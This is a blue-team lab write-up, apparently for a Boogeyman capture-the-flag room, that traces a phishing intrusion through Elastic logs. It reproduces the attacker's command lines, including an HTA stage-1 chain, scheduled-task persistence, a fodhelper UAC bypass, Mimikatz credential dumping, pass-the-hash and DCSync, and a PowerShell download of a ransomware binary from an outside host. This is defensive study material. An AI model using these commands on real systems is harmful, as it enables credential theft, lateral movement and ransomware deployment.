*The Boogeyman emerges from the darkness again.*

**Difficulty:** Medium

Due to the previous attacks of Boogeyman, Quick Logistics LLC hired a managed security service provider to handle its Security Operations Center. Little did they know, the Boogeyman was still lurking and waiting for the right moment to return.

---

### The Chaos Inside

*Without tripping any security defences of Quick Logistics LLC, the Boogeyman was able to compromise one of the employees and stayed in the dark, waiting for the right moment to continue the attack. Using this initial email access, the threat actors attempted to expand the impact by targeting the CEO, Evan Hutchinson.*

The compromised email user was `Allie Sierra`. Whose account sent  the CEO an email titled "Urgent Financial Matter Requiring Immediate Attention" which an attachment called "ProjectFinancialSummary_Q3.pdf".

*The email appeared questionable, but Evan still opened the attachment despite the scepticism. After opening the attached document and seeing that nothing happened, Evan reported the phishing email to the security team.*

*Upon receiving the phishing email report, the security team investigated the workstation of the CEO. During this activity, the team discovered the email attachment in the downloads folder of the 
victim.*

In addition, the security team also observed a file inside the ISO payload with file type "HTML Application".

### Questions

**What is the PID of the process that executed the initial stage 1 payload?**

During this investigation, I mostly looked at the columns `process.name`, `process.pid`, `process.command_line`, `process.parent.name`, `message`, `host.name`, `user.name`. I added the relevant ones as columns depending on the the type of activity each question required me to look into. I started by querying for the name of the file found inside the ISO payload. I found the below log of the `.hta` file being run with `mshta.exe`.  This process had a PID of **6392**.

(Elastic Search?): `*ProjectFinancialSummary_Q3.pdf*`

```
Aug 29, 2023 @ 23:51:15.856
"C:\Windows\SysWOW64\mshta.exe" "D:\ProjectFinancialSummary_Q3.pdf.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} 
process.name: mshta.exe
process.pid: 6,392
user.name: evan.hutchinson
host.name: WKSTN-0051.quicklogistics.org
```

---

**The stage 1 payload attempted to implant a file to another location. What is the full command-line value of this execution?**

`process.parent.name : "mshta.exe"`

This and the following two questions can be shown in the logs by looking at processes with a parent process of "mshta.exe" or PPID 6392. Applying this filter makes it easy to see the behavior of the stage 1 payload. 

The command line field shows the file `D:\review.dat` being copied to `evan.hutchinson`'s `Temp` folder.

```
Aug 29, 2023 @ 23:51:16.738
"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat
process.name: xcopy.exe
process.pid: 3,832
process.parent.name: mshta.exe
process.parent.pid: 6,392
user.name: evan.hutchinson
host.name: WKSTN-0051.quicklogistics.org
```

---

**The implanted file was eventually used and executed by the stage 1 payload. What is the full command-line value of this execution?**

`process.parent.name : "mshta.exe"`

```
Aug 29, 2023 @ 23:51:16.771
"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer
process.name: rundll32.exe
process.pid: 3,680
process.parent.name: mshta.exe
process.parent.pid: 6,392
user.name: evan.hutchinson
host.name: WKSTN-0051.quicklogistics.org
```

This log show the implanted file, "review.dat" being loaded as a DLL and calling the function DllRegisterServer. An example of the attacker attempting to blend the behavior of the stage 1 payload in with normal Windows events.

---

**The stage 1 payload established a persistence mechanism. What is the name of the scheduled task created by the malicious script?**

`process.parent.name : "mshta.exe"`

```
Aug 29, 2023 @ 23:51:16.809
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $A = New-ScheduledTaskAction -Execute 'rundll32.exe' -Argument 'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'; $T = New-ScheduledTaskTrigger -Daily -At 06:00; $S = New-ScheduledTaskSettingsSet; $P = New-ScheduledTaskPrincipal $env:username; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask Review -InputObject $D -Force;
process.name: powershell.exe
process.pid: 6,204
process.parent.name: mshta.exe
process.parent.pid: 6,392
user.name: evan.hutchinson
host.name: WKSTN-0051.quicklogistics.org
```

The task creation is also a child process of the stage 1 payload. This will execute the implanted file everyday, using "rundll32.exe" method shown previously and the copy of "review.dat" that was added to the Temp folder.

The last segment of the command line value includes the name of the task.

Register-ScheduledTask **Review** -InputObject $D -Force

---

**The execution of the implanted file inside the machine has initiated a potential C2 connection. What is the IP and port used by this connection? (format: IP:port)**

The implanted file is executed at `Aug 29, 2023 @ 23:51:16.771` using `C:\Windows\System32\rundll32.exe D:\review.dat,DllRegisterServer` as the process `rundll32.exe`, PID: `3680`. 

The first "Network connection detected" event is a second later at `Aug 29, 2023 @ 23:51:17`. These network events are associated with the process `rundll32.exe`, PID: `4672`, a child process of `rundll32.exe` PID: `3680`.

They can see be seen with the below filter. The below example is the first of 1,140 hits, almost all to **165.232.170.151 : 80**. 

`winlog.task : Network connection detected (rule: NetworkConnect)`

```
Aug 29, 2023 @ 23:51:17.910
 - 
Network connection detected:
RuleName: -
UtcTime: 2023-08-29 23:51:17.910
ProcessGuid: {6682e687-8475-64ee-d901-000000001200}
ProcessId: 4672
Image: C:\Windows\System32\rundll32.exe
User: QUICKLOGISTICS\evan.hutchinson
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.10.155.159
SourceHostname: WKSTN-0051.quicklogistics.org
SourcePort: 53937
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 165.232.170.151
DestinationHostname: -
DestinationPort: 80
DestinationPortName: http
```

---

**The attacker has discovered that the current access is a local administrator. What is the name of the process used by the attacker to execute a UAC bypass?**

I saw the process "fodhelper.exe" soon after and confirm that this is a common UAC bypass method. Windows will automatically elevate the process from Medium to High integrity, allowing the malware to hijack the handler of a file opened by fodhelper as a high integrity process. 

```
Aug 29, 2023 @ 23:54:49.213
process.name: fodhelper.exe
"C:\Windows\system32\fodhelper.exe" 
ProcessId: 5180
Image: C:\Windows\System32\fodhelper.exe
CommandLine: "C:\Windows\system32\fodhelper.exe" 
CurrentDirectory: C:\Windows\system32\
User: QUICKLOGISTICS\evan.hutchinson
ParentProcessId: 4672
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: "C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer
```

I found the below article helpful to learn about UAC bypass using fodhelper.

[eleastic security labs](https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies)

---

**Having a high privilege machine access, the attacker attempted to dump the credentials inside the machine. What is the GitHub link used by the attacker to download a tool for credential dumping?**

A useful query for this was `*iwr*` then looking at the command ling values of this filtered list of hits. I saw web requests to GitHub for Mimikatz, commonly used for credential dumping.

The parent process' command line value contains a Base64 encoded script, loaded from the registry value `HKCU:Software\Microsoft\Windows Update`. When decoded, it reveals a request to:  `cdn.bananapeelparty.net:80/news.php`.  Following the parent process chain, this is started by `fodhelper.exe`, PID: `5180`.

```
Aug 30, 2023 @ 00:09:57.186
process.name: powershell.exe
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile mimi.zip"
ProcessId: 6968
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: QUICKLOGISTICS\evan.hutchinson
ParentProcessId: 6160
```

After the Mimikatz download, we find the actual command used to dump credentials.

```
Aug 30, 2023 @ 00:11:26.438
evan.hutchinson
mimikatz.exe
"C:\Windows\Temp\m\x64\mimi\x64\mimikatz.exe" privilege::debug sekurlsa::logonpasswords exit

PID: 4,948
PPID: 6,160
```

---

**After successfully dumping the credentials inside the machine, the attacker used the credentials to gain access to another machine. What is the username and hash of the new credential pair? (format: username:hash)**

The next use of mimikatz shows the attacker used the ntlm hash to authenticate as the user `itadmin`.

```
Aug 30, 2023 @ 00:13:37.090
ProcessId: 1892
Image: C:\Windows\Temp\m\x64\mimi\x64\mimikatz.exe
CommandLine: "C:\Windows\Temp\m\x64\mimi\x64\mimikatz.exe" "sekurlsa::pth /user:itadmin /domain:QUICKLOGISTICS /ntlm:F84769D250EB95EB2D7D8B4A1C5613F2 /run:powershell.exe" exit
CurrentDirectory: C:\Windows\Temp\m\x64\mimi\x64\
User: QUICKLOGISTICS\evan.hutchinson
ParentProcessId: 6160
ParentUser: QUICKLOGISTICS\evan.hutchinson
WKSTN-0051.quicklogistics.org
```

---

**Using the new credentials, the attacker attempted to enumerate accessible file shares. What is the name of the file accessed by the attacker from a remote share?**

Enumerating the new machine's file system, host name: `WKSTN-1327.quicklogistics.org`,  the attacker found a file call `IT_Automation.ps1`.,

```
Aug 30, 2023 @ 00:19:52.889

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "cat FileSystem::\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1"

ProcessId: 4820
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CurrentDirectory: C:\Windows\Temp\m\x64\mimi\x64\
User: QUICKLOGISTICS\evan.hutchinson
ParentProcessId: 6160
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentUser: QUICKLOGISTICS\evan.hutchinson
WKSTN-0051.quicklogistics.org
```

---

**After getting the contents of the remote file, the attacker used the new credentials to move laterally. What is the new set of credentials discovered by the attacker? (format: username:password)**

Just after accessing the file `IT_Automation.ps1`, the attacker used `allen.smith`'s password.

```
Aug 30, 2023 @ 00:20:56.818

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$credential = (New-Object PSCredential -ArgumentList ('QUICKLOGISTICS\allan.smith', (ConvertTo-SecureString 'Tr!ckyP@ssw0rd987' -AsPlainText -Force))) ; Invoke-Command -Credential $credential -ComputerName WKSTN-1327 -ScriptBlock {whoami}"

ProcessId: 6848
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CurrentDirectory: C:\Windows\Temp\m\x64\mimi\x64\
User: QUICKLOGISTICS\evan.hutchinson
ParentProcessId: 6160
host.name: WKSTN-0051.quicklogistics.org
```

---

**What is the hostname of the attacker's target machine for its lateral movement attempt?**

Right after this lateral movement using `allan.smith`'s credentials, we see the host name change from `WKSTN-0051.quicklogistics.org` to `WKSTN-1327.quicklogistics.org`. 

```
Aug 30, 2023 @ 00:20:59.159

C:\Windows\system32\wsmprovhost.exe -Embedding

ProcessId: 4892
User: QUICKLOGISTICS\allan.smith
ParentProcessId: 752
host.name: WKSTN-1327.quicklogistics.org
```

---

**Using the malicious command executed by the attacker from the first machine to move laterally, what is the parent process name of the malicious command executed on the second compromised machine?**

As allan.smith, the attacker first creates a process with "whoami.exe", whose parent process is PID: `4892`, `wsmprovhost.exe`.

```
ug 30, 2023 @ 00:20:59.718

"C:\Windows\system32\whoami.exe"

ProcessId: 5076
Image: C:\Windows\System32\whoami.exe
OriginalFileName: whoami.exe
CommandLine: "C:\Windows\system32\whoami.exe"
CurrentDirectory: C:\Users\allan.smith\Documents\
User: QUICKLOGISTICS\allan.smith
ParentProcessId: 4892
ParentImage: C:\Windows\System32\wsmprovhost.exe
ParentCommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding
ParentUser: QUICKLOGISTICS\allan.smith
WKSTN-1327.quicklogistics.org
```
---

**The attacker then dumped the hashes in this second machine. What is the username and hash of the newly dumped credentials? (format: username:hash)**

At `Aug 30, 2023 @ 01:30:51`, the attacker ran the below command to dump credentials using `allan.smith`'s machine and obtained the ntlm hash of the `administrator` user.

`"C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe" privilege::debug sekurlsa::logonpasswords exit`

```
Aug 30, 2023 @ 01:31:39.366
mimikatz.exe
"C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe" "sekurlsa::pth /user:administrator /domain:QUICKLOGISTICS /ntlm:00f80f2538dcb54e7adc715c0e7091ec /run:powershell.exe" exit

ProcessId: 6236
Image: C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe
OriginalFileName: mimikatz.exe
CommandLine: "C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe" "sekurlsa::pth /user:administrator /domain:QUICKLOGISTICS /ntlm:00f80f2538dcb54e7adc715c0e7091ec /run:powershell.exe" exit
CurrentDirectory: C:\Users\allan.smith\Documents\mimi\x64\
User: QUICKLOGISTICS\allan.smith
ParentProcessId: 6708
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentUser: QUICKLOGISTICS\allan.smith
WKSTN-1327.quicklogistics.org
```

---

**After gaining access to the domain controller, the attacker attempted to dump the hashes via a DCSync attack. Aside from the administrator account, what account did the attacker dump?**

Once the attacker had access to the Administrator machine, host name `DC01.quicklogistics.org`, they attempted to dump the credentials of the `backupda` account.

```
Aug 30, 2023 @ 01:47:57.809

"C:\Users\Administrator\Documents\mimi\x64\mimikatz.exe" "lsadump::dcsync /domain:quicklogistics.org /user:backupda" exit

ProcessId: 6800
Image: C:\Users\Administrator\Documents\mimi\x64\mimikatz.exe
CurrentDirectory: C:\Users\Administrator\Documents\mimi\x64\
User: QUICKLOGISTICS\Administrator
ParentProcessId: 4008
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentUser: QUICKLOGISTICS\Administrator
DC01.quicklogistics.org
```

---

**After dumping the hashes, the attacker attempted to download another remote file to execute ransomware. What is the link used by the attacker to download the ransomware binary?**

The below log of a web request to `http://ff.sillytechninja.io` to retrieve a file called `ransomboogey.exe` happens shortly after dumping the credentials. 

The parent process of this request is again, encoded to command that reach out to `cdn.bananapeelparty.net:80/`, but this time to `/admin/get.php`. 

```
Aug 30, 2023 @ 01:53:13.738
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe"

ProcessId: 4308
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CurrentDirectory: C:\Users\Administrator\
User: QUICKLOGISTICS\Administrator
ParentProcessId: 4008
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -enc [base64 script connecting to "cdn.bananapeelparty.net:80/admin/get.php", redacted for brevity]
ParentUser: QUICKLOGISTICS\Administrator
DC01.quicklogistics.org
Administrator
```